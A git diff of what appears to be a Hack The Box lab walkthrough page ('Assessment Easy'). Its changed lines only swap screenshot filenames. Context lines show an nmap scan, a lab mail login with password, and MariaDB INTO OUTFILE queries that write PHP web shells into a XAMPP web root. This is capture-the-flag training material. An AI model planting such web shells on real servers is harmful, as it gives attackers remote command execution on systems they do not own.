@@ -1,6 +1,6 @@
 # Assessment Easy
 
-<figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>
 
 ```
 nmap 10.129.203.7 -p 21,25,80,443,587,3306,2289 -sC -sV -oN 10.129.203.7
@@ -61,13 +61,13 @@ PORT     STATE    SERVICE     VERSION
 |_  Auth Plugin Name: mysql_native_password
 ```
 
-<figure><img src="../../.gitbook/assets/image (62).png" alt=""><figcaption><p>fiona@inlanefreight.htb</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption><p>fiona@inlanefreight.htb</p></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption><p>fiona@inlanefreight.htb:987654321</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption><p>fiona@inlanefreight.htb:987654321</p></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
 
 ```
 MariaDB [phpmyadmin]> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdocs/dashboard/webshell.php';
@@ -81,7 +81,7 @@ MariaDB [(none)]> SELECT "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd 
 Query OK, 1 row affected (0.190 sec)
 ```
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 ```
 dir /s /b C:\flag.txt
